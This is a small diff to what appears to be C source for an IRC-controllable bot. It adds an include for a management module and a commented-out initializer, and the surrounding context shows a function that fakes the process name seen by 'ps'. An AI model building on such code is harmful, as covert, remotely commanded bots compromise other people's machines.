@@ -118,6 +118,8 @@ so nodes can use several communication methods, and irc can be used to control
 #include "modules/botlink/botlink.h"
 // data module
 #include "modules/data/data.h"
+// management
+#include "modules/management/management.h"
 
 #define MAX(a, b) ((a) > (b) ? ( a) : (b))
 #define MIN(a, b) ((a) < (b) ? ( a) : (b))
@@ -1191,6 +1193,8 @@ int main(int argc, char *argv[]) {
     //botlink_init(&module_list);
     // internal data storage
     data_init(&module_list);
+    // management
+    //MGR_init(&module_list);
     
     // fake name for 'ps'
     fakename_init(&module_list, argv, argc);
